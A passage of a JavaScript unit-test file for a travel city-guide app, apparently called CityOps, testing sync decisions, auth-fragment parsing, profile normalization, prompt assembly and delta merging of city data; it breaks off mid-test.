  assert.equal(C.syncKit.decide('2026-08-11T09:00:00.000Z', '2026-08-11T09:00:00+00:00'), 'noop');
  // and the offset form still orders correctly against a later Z stamp
  assert.equal(C.syncKit.decide('2026-08-11T09:00:00+00:00', B), 'pull');
});
test('syncKit.plan splits both sides and never resurrects a session-removed city', () => {
  const A = '2026-08-11T09:00:00.000Z';
  const B = '2026-08-11T10:00:00.000Z';
  const p = C.syncKit.plan(
    { keep: A, newer: B, localonly: A, wasremoved: B },
    { keep: A, newer: A, remoteonly: A, wasremoved: A, ghost: A },
    { wasremoved: 1, ghost: 1 }
  );
  assert.deepEqual(p.push, ['localonly', 'newer', 'wasremoved']); // local newer wins even for a removed-but-still-present city
  assert.deepEqual(p.pull, ['remoteonly']);
  assert.deepEqual(p.noop, ['ghost', 'keep']); // ghost exists only remotely and was removed here: skipped
  assert.deepEqual(C.syncKit.plan(null, null, null), { push: [], pull: [], noop: [] });
});
test('syncKit.buildRows shapes upsert rows and never sends user_id', () => {
  const rows = C.syncKit.buildRows('data', [
    { cityId: 'batumi-2026-08-08', payload: CITY_B, updatedAt: '2026-08-11T09:00:00.000Z' },
    { cityId: 'nostamp-2026-01-01', payload: CITY_Y },
    { cityId: 'bad', payload: null },
    null
  ]);
  assert.equal(rows.length, 2);
  assert.deepEqual(Object.keys(rows[0]).sort(), ['city_id', 'data', 'updated_at']);
  assert.equal(rows[0].data.city.name, 'Batumi');
  assert.equal(rows[1].updated_at, C.syncKit.EPOCH);
  const st = C.syncKit.buildRows('state', [{ cityId: 'x', payload: C.emptyState(), updatedAt: '2026-08-11T09:00:00.000Z' }]);
  assert.deepEqual(Object.keys(st[0]).sort(), ['city_id', 'state', 'updated_at']);
});
test('syncKit.parseAuthHash reads a GoTrue fragment and rejects incomplete ones', () => {
  const now = Date.parse('2026-08-11T09:00:00.000Z');
  const s = C.syncKit.parseAuthHash(
    '#access_token=aaa.bbb.ccc&expires_in=3600&refresh_token=rrr&token_type=bearer&type=magiclink', now);
  assert.equal(s.access_token, 'aaa.bbb.ccc');
  assert.equal(s.refresh_token, 'rrr');
  assert.equal(s.token_type, 'bearer');
  assert.equal(s.expires_at, Math.floor(now / 1000) + 3600);
  assert.equal(s.email, '');
  // an explicit expires_at wins over expires_in
  assert.equal(C.syncKit.parseAuthHash('#access_token=a&refresh_token=r&expires_in=3600&expires_at=1800000000', now).expires_at, 1800000000);
  // email rides along when the fragment carries one (url-encoded)
  assert.equal(C.syncKit.parseAuthHash('#access_token=a&refresh_token=r&email=rob%40example.com', now).email, 'rob@example.com');
  // no expiry information at all: mark it already expired so first use refreshes
  assert.equal(C.syncKit.parseAuthHash('#access_token=a&refresh_token=r', now).expires_at, Math.floor(now / 1000));
  assert.equal(C.syncKit.parseAuthHash('#refresh_token=r&expires_in=3600', now), null);          // no access token
  assert.equal(C.syncKit.parseAuthHash('#access_token=a&expires_in=3600', now), null);           // no refresh token
  assert.equal(C.syncKit.parseAuthHash('#city=batumi-2026-08-08', now), null);                   // the app's own hash
  assert.equal(C.syncKit.parseAuthHash('#error=access_denied&error_description=expired', now), null);
  assert.equal(C.syncKit.parseAuthHash('', now), null);
  assert.equal(C.syncKit.parseAuthHash(null, now), null);
  assert.equal(C.syncKit.parseAuthHash('#####', now), null);
});
test('syncKit.sessionExpiringSoon guards the 60s window and every unreadable case', () => {
  const now = Date.parse('2026-08-11T09:00:00.000Z');
  const at = (offsetSec) => ({ access_token: 'a', expires_at: Math.floor(now / 1000) + offsetSec });
  assert.equal(C.syncKit.sessionExpiringSoon(at(3600), now), false);
  assert.equal(C.syncKit.sessionExpiringSoon(at(61), now), false);
  assert.equal(C.syncKit.sessionExpiringSoon(at(59), now), true);
  assert.equal(C.syncKit.sessionExpiringSoon(at(-1), now), true);
  assert.equal(C.syncKit.sessionExpiringSoon({ access_token: 'a', expires_at: String(Math.floor(now / 1000) + 3600) }, now), false); // string seconds
  assert.equal(C.syncKit.sessionExpiringSoon({ access_token: 'a', expires_at: now + 3600000 }, now), false); // milliseconds
  assert.equal(C.syncKit.sessionExpiringSoon({ access_token: 'a' }, now), true);   // no expiry
  assert.equal(C.syncKit.sessionExpiringSoon({ expires_at: now / 1000 + 3600 }, now), true); // no token
  assert.equal(C.syncKit.sessionExpiringSoon(null, now), true);
});

// Task 1: intel schema validation + export round trip
test('validate accepts a full intel block', () => {
  const data = clone(GOOD);
  data.items[0].intel = {
    verdicts: [
      { tier: 'must', text: 'Adjarian khachapuri, the boat with the egg' },
      { tier: 'good', text: 'Pkhali plate to share' },
      { tier: 'skip', text: 'The seafood platter: frozen, priced for tourists' }
    ],
    tips: [
      'Go before 13:00 or after 15:00 to skip the queue',
      'Cash only despite the sign; ATM two doors down'
    ],
    source: 'Aggregated from Google and TripAdvisor reviews, mid-2026'
  };
  assert.deepEqual(C.validate(data), []);
});
test('validate accepts an item with no intel at all', () => {
  assert.deepEqual(C.validate(GOOD), []);
});
test('validate rejects a bad intel tier', () => {
  const data = clone(GOOD);
  data.items[0].intel = { verdicts: [{ tier: 'meh', text: 'Something' }] };
  const errs = C.validate(data);
  assert.ok(errs.some(e => /items\[0\] \(brasserie\) intel: verdicts\[0\] tier/.test(e)));
});
test('validate rejects an empty verdict text', () => {
  const data = clone(GOOD);
  data.items[0].intel = { verdicts: [{ tier: 'must', text: '  ' }] };
  const errs = C.validate(data);
  assert.ok(errs.some(e => /intel: verdicts\[0\] needs non-empty text/.test(e)));
});
test('validate rejects non-array verdicts and non-array tips', () => {
  const data = clone(GOOD);
  data.items[0].intel = { verdicts: 'must: khachapuri', tips: 'go early' };
  const errs = C.validate(data);
  assert.ok(errs.some(e => /intel: verdicts must be an array/.test(e)));
  assert.ok(errs.some(e => /intel: tips must be an array/.test(e)));
});
test('validate rejects a non-empty-string tip and a non-string source', () => {
  const data = clone(GOOD);
  data.items[0].intel = { tips: ['', 'fine'], source: 42 };
  const errs = C.validate(data);
  assert.ok(errs.some(e => /intel: tips\[0\] must be a non-empty string/.test(e)));
  assert.ok(errs.some(e => /intel: source must be a string/.test(e)));
});
test('validate rejects a non-object intel', () => {
  const data = clone(GOOD);
  data.items[0].intel = 'must: khachapuri';
  let errs = C.validate(data);
  assert.ok(errs.some(e => /items\[0\] \(brasserie\) intel: must be an object/.test(e)));
  data.items[0].intel = ['must: khachapuri'];
  errs = C.validate(data);
  assert.ok(errs.some(e => /intel: must be an object/.test(e)));
  data.items[0].intel = null;
  errs = C.validate(data);
  assert.deepEqual(errs, []); // null/undefined intel is treated as absent
});
test('buildExport round trip with intel present deep-equals', () => {
  const data = clone(GOOD);
  data.items[0].intel = {
    verdicts: [
      { tier: 'must', text: 'Adjarian khachapuri' },
      { tier: 'skip', text: 'Seafood platter' }
    ],
    tips: ['Go before 13:00'],
    source: 'Reviews, mid-2026'
  };
  assert.deepEqual(C.validate(data), []);
  const st = C.emptyState();
  const out = C.buildExport(data, st);
  assert.deepEqual(out.items.find(i => i.id === 'brasserie').intel, data.items[0].intel);
  const again = C.buildExport(C.parse(JSON.stringify(out)).data, C.emptyState());
  assert.deepEqual(again, out);
});

// Task 2: interest profile + prompt assembly
test('profile.normalize returns the empty shape for junk input', () => {
  const empty = { schema: 1, interests: [], avoid: [], factors: [], notes: '', showExample: false, updated: null };
  assert.deepEqual(C.profile.normalize(null), empty);
  assert.deepEqual(C.profile.normalize(undefined), empty);
  assert.deepEqual(C.profile.normalize('nope'), empty);
  assert.deepEqual(C.profile.normalize([1, 2]), empty);
  assert.deepEqual(C.profile.normalize({ interests: 'climbing', avoid: 7, notes: 42 }), empty);
});
test('profile.normalize trims, drops empties, dedupes case-insensitively keeping the first', () => {
  const p = C.profile.normalize({
    interests: ['  climbing gyms ', 'Climbing Gyms', '', '   ', 'live jazz', 12, null, 'LIVE JAZZ'],
    avoid: ['Nightclubs', 'nightclubs '],
    notes: '   Vegetarian most days.   '
  });
  assert.deepEqual(p.interests, ['climbing gyms', 'live jazz']);
  assert.deepEqual(p.avoid, ['Nightclubs']);
  assert.equal(p.notes, 'Vegetarian most days.');
  assert.equal(p.schema, 1);
  assert.equal(p.updated, null);
});
test('profile.normalize caps each list at 30 and notes at 2000 chars', () => {
  const many = [];
  for (let i = 0; i < 45; i++) many.push('interest ' + i);
  const p = C.profile.normalize({ interests: many, avoid: many, notes: 'x'.repeat(2500) });
  assert.equal(p.interests.length, 30);
  assert.equal(p.interests[29], 'interest 29');
  assert.equal(p.avoid.length, 30);
  assert.equal(p.notes.length, 2000);
});
test('profile.normalize keeps a string updated stamp and rejects anything else', () => {
  assert.equal(C.profile.normalize({ updated: '2026-08-12T10:00:00Z' }).updated, '2026-08-12T10:00:00Z');
  assert.equal(C.profile.normalize({ updated: 12345 }).updated, null);
  assert.equal(C.profile.normalize({ updated: '' }).updated, null);
});
test('profile.isEmpty ignores the stamp and sees any real content', () => {
  assert.equal(C.profile.isEmpty(null), true);
  assert.equal(C.profile.isEmpty({ updated: '2026-08-12T10:00:00Z' }), true);
  assert.equal(C.profile.isEmpty({ interests: ['   '] }), true);
  assert.equal(C.profile.isEmpty({ interests: ['live jazz'] }), false);
  assert.equal(C.profile.isEmpty({ avoid: ['nightclubs'] }), false);
  assert.equal(C.profile.isEmpty({ notes: 'Vegetarian' }), false);
});
test('appStore.normalize carries a normalized profile and survives add/remove', () => {
  const empty = C.appStore.normalize(null);
  assert.deepEqual(empty.profile, { schema: 1, interests: [], avoid: [], factors: [], notes: '', showExample: false, updated: null });
  let s = C.appStore.normalize({ profile: { interests: ['live jazz', 'LIVE JAZZ'], notes: ' walks a lot ' } });
  assert.deepEqual(s.profile.interests, ['live jazz']);
  assert.equal(s.profile.notes, 'walks a lot');
  s = C.appStore.add(s, CITY_B).store;
  assert.deepEqual(s.profile.interests, ['live jazz']);
  s = C.appStore.remove(s, 'batumi-2026-08-08');
  assert.deepEqual(s.profile.interests, ['live jazz']);
});
// ---- Phase 2, Feature 1: planning factors (part 1: shape, no template needed) ----
test('profile.FACTOR_LEVELS is the exact five-point scale', () => {
  assert.deepEqual(C.profile.FACTOR_LEVELS, ['blocker', 'very important', 'medium', 'low', 'not important']);
});
test('profile.defaultFactors seeds 7 sensible factors at medium and hands out a fresh array each call', () => {
  const a = C.profile.defaultFactors();
  const b = C.profile.defaultFactors();
  assert.equal(a.length, 7);
  assert.ok(a.every((f) => f.level === 'medium' && f.custom === false));
  assert.ok(a.some((f) => f.label === 'Walkability'));
  a[0].level = 'blocker';
  assert.equal(b[0].level, 'medium'); // mutating one caller's array never touches another's
});
test('profile.normalizeFactors drops bad levels and junk, dedupes by label, assigns slug ids', () => {
  const out = C.profile.normalizeFactors([
    { label: 'Nightlife', level: 'blocker' },
    { label: '  Nightlife ', level: 'medium' },       // dup label, dropped
    { label: 'Safety', level: 'not a level' },          // bad level, dropped
    { label: '', level: 'low' },                        // no label, dropped
    'nope',                                              // not an object, dropped
    { label: 'Food Scene', level: 'very important', custom: true }
  ]);
  assert.deepEqual(out, [
    { id: 'nightlife', label: 'Nightlife', level: 'blocker', custom: false },
    { id: 'food-scene', label: 'Food Scene', level: 'very important', custom: true }
  ]);
});
test('profile.normalizeFactors dedupes id collisions from different labels', () => {
  const out = C.profile.normalizeFactors([
    { label: 'Café!', level: 'medium' },
    { label: 'Café?', level: 'low' }
  ]);
  assert.deepEqual(out.map((f) => f.id), ['caf', 'caf-2']);
});
test('profile.normalizeFactors caps at 30', () => {
  const many = [];
  for (let i = 0; i < 45; i++) many.push({ label: 'factor ' + i, level: 'medium' });
  assert.equal(C.profile.normalizeFactors(many).length, 30);
});
test('profile.normalize carries factors through and profile.isEmpty counts them', () => {
  const p = C.profile.normalize({ factors: [{ label: 'Safety', level: 'blocker' }] });
  assert.deepEqual(p.factors, [{ id: 'safety', label: 'Safety', level: 'blocker', custom: false }]);
  assert.equal(C.profile.isEmpty(p), false);
  assert.equal(C.profile.isEmpty({ factors: [] }), true);
});

// ---- Phase 2, Feature 2: shared JSON-fence extraction ----
test('extractJsonBlock finds a ```json fence and returns its trimmed, parseable body', () => {
  const md = 'Here is the guide:\n\n```json\n' + JSON.stringify(GOOD) + '\n```\n';
  assert.deepEqual(JSON.parse(C.extractJsonBlock(md)), GOOD);
});
test('extractJsonBlock accepts a bare fence with no json language tag', () => {
  const md = '```\n' + JSON.stringify(GOOD) + '\n```\n';
  assert.deepEqual(JSON.parse(C.extractJsonBlock(md)), GOOD);
});
test('extractJsonBlock skips a non-JSON fence and finds a later one that parses', () => {
  const md = '```bash\nnpm install\n```\n\n```json\n' + JSON.stringify(GOOD) + '\n```\n';
  assert.deepEqual(JSON.parse(C.extractJsonBlock(md)), GOOD);
});
test('extractJsonBlock returns null when nothing in the text parses as JSON', () => {
  assert.equal(C.extractJsonBlock('Sorry, ran out of room, ask me for the JSON separately.'), null);
  assert.equal(C.extractJsonBlock(''), null);
});
test('RETRY_INSTRUCTION is the shared re-ask message the CLI and the app both show', () => {
  assert.ok(/reply with the full city guide as a single/.test(C.RETRY_INSTRUCTION));
});

// ---- No-paste import: isJsonSyntaxError + fetchTextToCity (pure) ----
test('isJsonSyntaxError is true only for a lone JSON-parse error', () => {
  assert.equal(C.isJsonSyntaxError(C.parse('{ nope').errors), true);
  const bad = clone(GOOD);
  bad.schema = 2;
  assert.equal(C.isJsonSyntaxError(C.parse(JSON.stringify(bad)).errors), false); // schema errors, not a syntax error
  assert.equal(C.isJsonSyntaxError([]), false);
  assert.equal(C.isJsonSyntaxError(null), false);
});
test('fetchTextToCity: direct valid JSON succeeds with kind ok', () => {
  const res = C.fetchTextToCity(JSON.stringify(GOOD));
  assert.equal(res.kind, 'ok');
  assert.equal(res.data.city.name, 'Batumi');
  assert.deepEqual(res.errors, []);
});
test('fetchTextToCity: valid JSON that fails schema is kind invalid, no fence fallback attempted', () => {
  const bad = clone(GOOD);
  bad.schema = 2;
  const res = C.fetchTextToCity(JSON.stringify(bad));
  assert.equal(res.kind, 'invalid');
  assert.equal(res.data, null);
  assert.ok(res.errors.some((e) => /schema must be 1/.test(e)));
});
test('fetchTextToCity: not JSON at all, and no fenced JSON either, is kind not-json', () => {
  const res = C.fetchTextToCity('Sorry, I ran out of room. Ask me again.');
  assert.equal(res.kind, 'not-json');
  assert.equal(res.data, null);
});
test('fetchTextToCity: a raw .md guide falls back to the fenced JSON block and succeeds', () => {
  const md = 'Here is your guide:\n\n```json\n' + JSON.stringify(GOOD) + '\n```\n';
  const res = C.fetchTextToCity(md);
  assert.equal(res.kind, 'ok');
  assert.equal(res.data.city.name, 'Batumi');
});
test('fetchTextToCity: a fenced block that parses but fails schema is kind invalid', () => {
  const bad = clone(GOOD);
  bad.items[0].status = 'someday';
  const md = 'notes before\n```json\n' + JSON.stringify(bad) + '\n```\nnotes after';
  const res = C.fetchTextToCity(md);
  assert.equal(res.kind, 'invalid');
  assert.ok(res.errors.some((e) => /bad status/.test(e)));
});
test('fetchTextToCity: empty text is not-json, not a thrown error', () => {
  const res = C.fetchTextToCity('');
  assert.equal(res.kind, 'not-json');
  assert.equal(res.data, null);
});
test('cities/index.json lists every bundled city, each file present and valid', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const manifest = JSON.parse(fs.readFileSync(path.join(root, 'cities', 'index.json'), 'utf8'));
  assert.ok(Array.isArray(manifest.cities) && manifest.cities.length >= 3);
  const bundled = fs.readdirSync(path.join(root, 'cities')).filter((f) => f.endsWith('.json') && f !== 'index.json');
  assert.deepEqual(manifest.cities.map((c) => c.file).sort(), bundled.sort());
  manifest.cities.forEach((c) => {
    assert.ok(c.name && typeof c.name === 'string');
    assert.ok(c.dates && typeof c.dates === 'string');
    const res = C.parse(fs.readFileSync(path.join(root, 'cities', c.file), 'utf8'));
    assert.deepEqual(res.errors, []);
    assert.equal(res.data.city.name, c.name, c.file + ' manifest name must match the city JSON');
  });
});

// ---- Phase 2, Feature 3: example-city visibility ----
test('appStore.exampleVisible shows the example when there are no real cities yet', () => {
  assert.equal(C.appStore.exampleVisible([], 'example-seed', false), true);
  assert.equal(C.appStore.exampleVisible(['example-seed'], 'example-seed', false), true);
});
test('appStore.exampleVisible hides the example once a real city exists, unless the toggle is on', () => {
  assert.equal(C.appStore.exampleVisible(['example-seed', 'batumi-2026-08-08'], 'example-seed', false), false);
  assert.equal(C.appStore.exampleVisible(['example-seed', 'batumi-2026-08-08'], 'example-seed', true), true);
});
test('appStore.exampleVisible treats a missing/undefined id list as no real cities', () => {
  assert.equal(C.appStore.exampleVisible(undefined, 'example-seed', false), true);
});

test('promptKit.INTERESTS_SECTION is the ninth section descriptor', () => {
  assert.deepEqual(C.promptKit.INTERESTS_SECTION, { id: 'interests', label: 'My interests', icon: '⭐' });
});

// A small stand-in for PROMPT.md carrying the same landmark lines the builder
// edits, so these assertions test the assembly and not the wording of the file.
const FAKE_PROMPT = [
  '# CityOps generation prompt',
  '',
  C.promptKit.COPY_LINE,
  '',
  '---',
  '',
  '## Trip details',
  '',
  '- **City:** [city name]',
  '- **Country:** [country, ISO 2-letter code if you know it, e.g. GE, AM]',
  '- **Dates:** [arrival date] to [departure date], ISO format (YYYY-MM-DD)',
  '- **Accommodation:** [name of hotel/apartment/building], [full address]',
  '- **Arrival transport:** [flight/train/etc, arrival time if known]',
  '- **Departure transport:** [flight/train/etc, departure time if known]',
  '',
  '## Traveler profile',
  '',
  'Solo traveler. Works mornings.',
  '',
  '[Add anything trip-specific here.]',
  '',
  '---',
  '',
  '## What I need',
  '',
  'Research this city.',
  ''
].join('\n');

const HEADER = {
  name: 'Tirana', country: 'AL', from: '2026-09-01', to: '2026-09-08',
  accommodation: 'Rooms Tirana, Rruga Myslym Shyri 12',
  arrival: 'W6 4351, lands 14:20', departure: 'W6 4352, 06:15'
};

test('buildCityPrompt fills every trip-details bullet and removes the copy-this-file line', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, null);
  assert.equal(out.indexOf(C.promptKit.COPY_LINE), -1);
  assert.ok(out.includes('- **City:** Tirana'));
  assert.ok(out.includes('- **Country:** AL'));
  assert.ok(out.includes('- **Dates:** 2026-09-01 to 2026-09-08, ISO format (YYYY-MM-DD)'));
  assert.ok(out.includes('- **Accommodation:** Rooms Tirana, Rruga Myslym Shyri 12'));
  assert.ok(out.includes('- **Arrival transport:** W6 4351, lands 14:20'));
  assert.ok(out.includes('- **Departure transport:** W6 4352, 06:15'));
  // Untouched body text and the traveler-profile bracket both survive.
  assert.ok(out.includes('[Add anything trip-specific here.]'));
  assert.ok(out.includes('Research this city.'));
});
test('buildCityPrompt leaves a placeholder wherever the value is empty', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, { name: 'Tirana', from: '2026-09-01' }, null);
  assert.ok(out.includes('- **City:** Tirana'));
  assert.ok(out.includes('- **Country:** [country, ISO 2-letter code if you know it, e.g. GE, AM]'));
  assert.ok(out.includes('- **Dates:** 2026-09-01 to [departure date], ISO format (YYYY-MM-DD)'));
  assert.ok(out.includes('- **Accommodation:** [name of hotel/apartment/building], [full address]'));
  assert.ok(out.includes('- **Arrival transport:** [flight/train/etc, arrival time if known]'));
  const none = C.promptKit.buildCityPrompt(FAKE_PROMPT, null, null);
  assert.ok(none.includes('- **City:** [city name]'));
});
test('buildCityPrompt inserts the interests block after the traveler profile', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, {
    interests: ['climbing gyms', 'live jazz'],
    avoid: ['nightclubs'],
    notes: 'Vegetarian most days.'
  });
  assert.ok(out.includes('## Traveler interests'));
  assert.ok(out.includes('Add a ninth section for these interests as described under Interests below.'));
  assert.ok(out.includes('- climbing gyms'));
  assert.ok(out.includes('- live jazz'));
  assert.ok(out.includes('- nightclubs'));
  assert.ok(out.includes('Notes: Vegetarian most days.'));
  // Placement: after the traveler-profile bracket, before the rule that closes
  // the header, and therefore before "What I need".
  assert.ok(out.indexOf('[Add anything trip-specific here.]') < out.indexOf('## Traveler interests'));
  assert.ok(out.indexOf('## Traveler interests') < out.indexOf('## What I need'));
  assert.ok(out.indexOf('## Traveler interests') < out.lastIndexOf('\n---'));
});
test('buildCityPrompt omits empty halves of the interests block', () => {
  const only = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, { interests: ['live jazz'] });
  assert.ok(only.includes('Interests, in priority order:'));
  assert.equal(only.indexOf('Avoid, do not suggest any of these:'), -1);
  assert.equal(only.indexOf('Notes:'), -1);
});
test('buildCityPrompt inserts nothing at all when the profile is empty', () => {
  [null, undefined, {}, { interests: [], avoid: [], notes: '  ' }, { updated: '2026-08-12T10:00:00Z' }]
    .forEach((p) => {
      const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, p);
      assert.equal(out.indexOf('## Traveler interests'), -1);
      assert.equal(out.indexOf('Add a ninth section'), -1);
    });
});
test('buildCityPrompt never mutates its inputs and tolerates a bare template', () => {
  const before = FAKE_PROMPT;
  const p = { interests: ['live jazz'] };
  C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, p);
  assert.equal(FAKE_PROMPT, before);
  assert.deepEqual(p, { interests: ['live jazz'] });
  assert.equal(C.promptKit.buildCityPrompt('', HEADER, null), '');
  // No traveler-profile landmark: the block still lands, ahead of What I need.
  const bare = '## What I need\n\nResearch this city.\n';
  const out = C.promptKit.buildCityPrompt(bare, HEADER, { interests: ['live jazz'] });
  assert.ok(out.indexOf('## Traveler interests') < out.indexOf('## What I need'));
});
// ---- Phase 2, Feature 1 (part 2): factors and trip notes inside the real prompt shape ----
test('buildCityPrompt phrases blocker factors as hard exclusions and the rest as weighted preferences, strongest first', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, {
    factors: [
      { label: 'Nightlife', level: 'low' },
      { label: 'Safety', level: 'blocker' },
      { label: 'Walkability', level: 'very important' },
      { label: 'Food scene', level: 'not important' },
      { label: 'Transit quality', level: 'medium' }
    ]
  });
  assert.ok(out.includes('Hard exclusions'));
  assert.ok(out.includes('- Safety'));
  assert.ok(out.includes('Weighted preferences'));
  assert.ok(out.includes('- Walkability (very important)'));
  assert.ok(out.includes('- Transit quality (medium)'));
  assert.ok(out.includes('- Nightlife (low)'));
  // not important is left out entirely, not listed with a "no preference" line
  assert.equal(out.indexOf('Food scene'), -1);
  // strongest-first ordering
  assert.ok(out.indexOf('Walkability (very important)') < out.indexOf('Transit quality (medium)'));
  assert.ok(out.indexOf('Transit quality (medium)') < out.indexOf('Nightlife (low)'));
});
test('buildCityPrompt with only planning factors still inserts the Traveler interests block', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, {
    factors: [{ label: 'Safety', level: 'blocker' }]
  });
  assert.ok(out.includes('## Traveler interests'));
});
test('buildCityPrompt fills the trip-specific bracket paragraph from header.notes', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, { name: 'Tirana', notes: 'Vegetarian, traveling with a toddler.' }, null);
  assert.ok(out.includes('Vegetarian, traveling with a toddler.'));
  assert.equal(out.indexOf('[Add anything trip-specific here'), -1);
});
test('buildCityPrompt leaves the trip-specific bracket alone when notes is empty', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, { name: 'Tirana' }, null);
  assert.ok(out.includes('[Add anything trip-specific here.]'));
});

test('index.html embeds PROMPT.md verbatim, escaped and reversible; template.html carries none of it', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const idx = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
  const m = idx.match(/<script type="text\/plain" id="prompt-template">\n([\s\S]*?)\n<\/script>/);
  assert.ok(m, 'prompt-template block missing or closed early');
  assert.equal(m[1].indexOf('</script'), -1);   // a raw close tag would end the block
  // Exactly the unescape the app performs when it reads the block.
  const un = m[1].replace(/<\\\/script/g, '</script');
  assert.equal(un, fs.readFileSync(path.join(root, 'PROMPT.md'), 'utf8'));
  // Standalone guides are app-free: no prompt template, no builders.
  const tpl = fs.readFileSync(path.join(root, 'template.html'), 'utf8');
  assert.equal(tpl.indexOf('prompt-template'), -1);
});
test('syncKit.decide drives the profile reconcile the same way it drives cities', () => {
  // The app shell reconciles the profile with decide(local.updated, remote.updated_at).
  const local = '2026-08-12T10:00:00.000Z';
  const remote = '2026-08-12T11:00:00+00:00';
  assert.equal(C.syncKit.decide(local, remote), 'pull');
  assert.equal(C.syncKit.decide(remote, local), 'push');
  assert.equal(C.syncKit.decide(local, null), 'push');   // never synced: send it up
  assert.equal(C.syncKit.decide(null, remote), 'pull');  // never edited here: take theirs
  assert.equal(C.syncKit.decide(null, null), 'noop');    // never edited anywhere: nothing to do
});

// ---- Task 3: mergeDelta ----

const DELTA = {
  schema: 1,
  delta: true,
  sections: [{ id: 'interests', label: 'My interests', icon: '⭐' }],
  items: [
    { id: 'boulder', section: 'interests', status: 'plan', name: 'Boulder Hall',
      links: [], place_id: null, verified: null },
    { id: 'jazzve', section: 'coffee', status: 'backup', name: 'Jazzve', links: [] }
  ],
  intel: {
    brasserie: {
      verdicts: [{ tier: 'must', text: 'Adjarian khachapuri' }],
      tips: ['Go before 13:00'],
      source: 'Aggregated from Google reviews, mid-2026'
    }
  }
};

test('mergeDelta adds new items and new sections and counts them', () => {
  const r = C.mergeDelta(GOOD, clone(DELTA));
  assert.deepEqual(r.errors, []);
  assert.deepEqual(r.summary, { added: 2, skipped: 0, sectionsAdded: 1, intelApplied: 1, intelSkipped: 0, ratingsApplied: 0, ratingsSkipped: 0 });
  assert.equal(r.data.sections.length, 3);
  assert.equal(r.data.sections[2].id, 'interests');   // appended, never reordered
  assert.equal(r.data.items.length, GOOD.items.length + 2);
  const added = r.data.items.filter((it) => it.id === 'boulder' || it.id === 'jazzve');
  assert.equal(added.length, 2);
  // place_id/verified are normalized to null when the payload omits them.
  const jazzve = r.data.items.find((it) => it.id === 'jazzve');
  assert.equal(jazzve.place_id, null);
  assert.equal(jazzve.verified, null);
});

test('mergeDelta skips an id that already exists instead of overwriting it', () => {
  const d = clone(DELTA);
  d.items.push({ id: 'brasserie', section: 'dinner', status: 'plan', name: 'Impostor', links: [] });
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.added, 2);
  assert.equal(r.summary.skipped, 1);
  const kept = r.data.items.filter((it) => it.id === 'brasserie');
  assert.equal(kept.length, 1);
  assert.equal(kept[0].name, 'Brasserie 1900');       // the traveler's copy wins
  assert.equal(kept[0].note, '4.8 stars, reserve.');  // and nothing else moved
});

test('mergeDelta applied twice is a no-op: everything is already there', () => {
  const first = C.mergeDelta(GOOD, clone(DELTA));
  const second = C.mergeDelta(first.data, clone(DELTA));
  assert.deepEqual(second.errors, []);
  assert.deepEqual(second.summary,
    { added: 0, skipped: 2, sectionsAdded: 0, intelApplied: 1, intelSkipped: 0, ratingsApplied: 0, ratingsSkipped: 0 });
  assert.deepEqual(second.data, first.data);
});

test('mergeDelta ignores an existing section id rather than overwriting its label', () => {
  const d = { schema: 1, delta: true, sections: [{ id: 'dinner', label: 'Renamed by the AI' }] };
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.sectionsAdded, 0);
  assert.equal(r.data.sections.length, 2);
  assert.equal(r.data.sections[0].label, 'Dinner');
});

test('mergeDelta rejects duplicate ids within one delta', () => {
  const d = clone(DELTA);
  d.items.push({ id: 'boulder', section: 'interests', status: 'plan', name: 'Twin', links: [] });
  const r = C.mergeDelta(GOOD, d);
  assert.equal(r.data, null);
  assert.ok(r.errors.some((e) => /duplicate item id "boulder"/.test(e)));
});

test('mergeDelta rejects a bad envelope, unknown section, done status and bad intel', () => {
  const bad = (patch) => C.mergeDelta(GOOD, Object.assign(clone(DELTA), patch));
  assert.ok(bad({ schema: 2 }).errors.some((e) => /schema must be 1/.test(e)));
  assert.ok(bad({ delta: false }).errors.some((e) => /delta must be true/.test(e)));
  assert.ok(bad({ delta: undefined }).errors.some((e) => /delta must be true/.test(e)));
  assert.equal(C.mergeDelta(GOOD, null).data, null);
  assert.equal(C.mergeDelta(null, clone(DELTA)).data, null);
  assert.equal(C.mergeDelta(GOOD, 'nope').data, null);

  const unknown = bad({ sections: undefined });   // boulder's section no longer exists
  assert.equal(unknown.data, null);
  assert.ok(unknown.errors.some((e) => /unknown section "interests"/.test(e)));

  ['done', 'archived'].forEach((status) => {
    const r = C.mergeDelta(GOOD, {
      schema: 1, delta: true,
      items: [{ id: 'x', section: 'dinner', status: status, name: 'X', links: [] }]
    });
    assert.equal(r.data, null);
    assert.ok(r.errors.some((e) =>
      e.includes('bad status "' + status + '" (a delta may only add plan or backup items)')),
      r.errors.join(' | '));
  });

  const badIntel = bad({ intel: { brasserie: { verdicts: [{ tier: 'nope', text: 'x' }] } } });
  assert.equal(badIntel.data, null);
  assert.ok(badIntel.errors.some((e) => /intel\["brasserie"\]: verdicts\[0\] tier must be must\|good\|skip/.test(e)));
  assert.equal(bad({ intel: [] }).data, null);
  assert.equal(bad({ items: 'nope' }).data, null);
  assert.equal(bad({ sections: 'nope' }).data, null);
  // A rejected delta reports a zeroed summary: nothing partial ever happened.
  assert.deepEqual(bad({ schema: 2 }).summary,
    { added: 0, skipped: 0, sectionsAdded: 0, intelApplied: 0, intelSkipped: 0, ratingsApplied: 0, ratingsSkipped: 0 });
});

test('mergeDelta applies intel to existing ids and counts unknown ids as skipped', () => {
  const d = {
    schema: 1, delta: true,
    intel: {
      brasserie: { verdicts: [{ tier: 'must', text: 'The khachapuri' }], source: 'Reviews' },
      nord: { tips: ['Order at the bar'] },
      ghost: { tips: ['Nobody lives here'] }
    }
  };
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.errors, []);
